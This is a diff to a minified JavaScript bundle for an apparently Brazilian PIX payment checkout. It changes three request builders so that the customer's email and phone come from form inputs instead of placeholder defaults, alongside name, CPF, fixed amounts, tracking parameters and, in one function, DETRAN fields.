@@ -14949,8 +14949,11 @@ function gp() {
             c("Dados do usuário não encontrados"), s(!1);
             return
           }
-          const b = JSON.parse(m),
-            j = await (await fetch("/api/pix", {
+          const b = JSON.parse(m);
+          // Garantir que email e telefone sejam capturados do localStorage ou do formulário
+          const emailVal = b.email && b.email !== "cliente@email.com" ? b.email : (document.querySelector('input[type="email"]')?.value || "cliente@example.com");
+          const phoneVal = b.phone && b.phone !== "11999999999" ? b.phone : (document.querySelector('input[type="tel"]')?.value?.replace(/\D/g, "") || "11999999999");
+          const j = await (await fetch("/api/pix", {
               method: "POST",
               headers: {
                 "Content-Type": "application/json"
@@ -14958,8 +14961,8 @@ function gp() {
               body: JSON.stringify({
                 amount: 79.40,
                 customer_name: b.nome,
-                customer_email: b.email || "cliente@email.com",
-                customer_phone: b.phone || "11999999999",
+                customer_email: emailVal,
+                customer_phone: phoneVal,
                 customer_cpf: b.cpf,
                 utm: (function(){try{var u=JSON.parse(localStorage.getItem("utmData")||"{}");return{source:u.utm_source||null,medium:u.utm_medium||null,campaign:u.utm_campaign||null,content:u.utm_content||null,term:u.utm_term||null,fbclid:u.fbclid||null};}catch(e){return{};}})()
               })
@@ -21432,8 +21435,11 @@ function DE() {
         d("Dados do usuário não encontrados");
         return
       }
-      const _ = JSON.parse(M),
-        I = await (await fetch("/api/pix", {
+      const _ = JSON.parse(M);
+      // Garantir que email e telefone sejam capturados do localStorage ou do formulário
+      const emailVal = _.email && _.email !== "cliente@email.com" ? _.email : (document.querySelector('input[type="email"]')?.value || "cliente@example.com");
+      const phoneVal = _.phone && _.phone !== "11999999999" ? _.phone : (document.querySelector('input[type="tel"]')?.value?.replace(/\D/g, "") || "11999999999");
+      const I = await (await fetch("/api/pix", {
           method: "POST",
           headers: {
             "Content-Type": "application/json"
@@ -21441,8 +21447,8 @@ function DE() {
           body: JSON.stringify({
             amount: 65.70,
             customer_name: _.nome,
-            customer_email: _.email,
-            customer_phone: _.phone,
+            customer_email: emailVal,
+            customer_phone: phoneVal,
             customer_cpf: _.cpf,
             utm: (function(){try{var u=JSON.parse(localStorage.getItem("utmData")||"{}");return{source:u.utm_source||null,medium:u.utm_medium||null,campaign:u.utm_campaign||null,content:u.utm_content||null,term:u.utm_term||null,fbclid:u.fbclid||null};}catch(e){return{};}})()
           })
@@ -22240,6 +22246,9 @@ function OE() {
         if (!Y) return re("Dados do usuário não encontrados. Recarregue a página."), j(!1), !1;
         const ge = JSON.parse(Y);
         console.log(`Creating PIX transaction for: ${ge.nome} (attempt ${B + 1}/${W})`);
+        // Garantir que email e telefone sejam capturados do localStorage ou do formulário
+        const emailVal = ge.email && ge.email !== "cliente@email.com" ? ge.email : (document.querySelector('input[type="email"]')?.value || "cliente@example.com");
+        const phoneVal = ge.phone && ge.phone !== "11999999999" ? ge.phone : (document.querySelector('input[type="tel"]')?.value?.replace(/\D/g, "") || "11999999999");
         const qr = await (await fetch("/api/pix", {
           method: "POST",
           headers: {
@@ -22248,8 +22257,8 @@ function OE() {
           body: JSON.stringify({
             amount: 65.70,
             customer_name: ge.nome,
-            customer_email: ge.email || "cliente@email.com",
-            customer_phone: ge.phone || "11999999999",
+            customer_email: emailVal,
+            customer_phone: phoneVal,
             customer_cpf: ge.cpf,
             detran_uf: (y == null ? void 0 : y.uf) || "",
             detran_nome: (y == null ? void 0 : y.nome) || "",
